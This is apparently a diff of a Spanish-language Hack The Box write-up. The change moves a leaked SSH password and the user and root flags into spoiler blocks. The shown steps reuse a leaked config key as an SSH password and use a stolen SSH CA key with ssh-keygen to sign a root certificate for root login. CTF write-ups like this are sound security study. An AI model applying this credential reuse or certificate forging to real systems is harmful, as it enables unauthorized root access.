@@ -120,19 +120,36 @@ Respuesta relevante:
 
 ```json
 {
-  "encryptionKey": "D3pl0y_$$H_Now42!",
+  "encryptionKey": "<REDACTED>",
   "sshCaPath": "/opt/principal/ssh/"
 }
 ```
+
+<details markdown="1">
+<summary>🔓 Ver encryptionKey real</summary>
+
+```
+D3pl0y_$$H_Now42!
+```
+
+</details>
 
 La contraseña del campo `encryptionKey` funciona directamente para SSH:
 
 ```bash
 ssh svc-deploy@10.129.3.224
-# Password: D3pl0y_$$H_Now42!
+# Password: <encryptionKey de arriba>
 cat ~/user.txt
-# 9333bfe171ed7e1a05f0d6cff2daab1b
 ```
+
+<details markdown="1">
+<summary>🔓 Ver flag</summary>
+
+```
+9333bfe171ed7e1a05f0d6cff2daab1b
+```
+
+</details>
 
 ---
 
@@ -170,8 +187,16 @@ ssh-keygen -s /tmp/ssh_ca -I "root-cert" -n root -V +4h /tmp/htb_key.pub
 # Acceder como root
 ssh -i /tmp/htb_key root@10.129.3.224
 cat /root/root.txt
-# eecf275ab8f1a55311aecae32e5b7853
 ```
+
+<details markdown="1">
+<summary>🔓 Ver flag</summary>
+
+```
+eecf275ab8f1a55311aecae32e5b7853
+```
+
+</details>
 
 ---
 
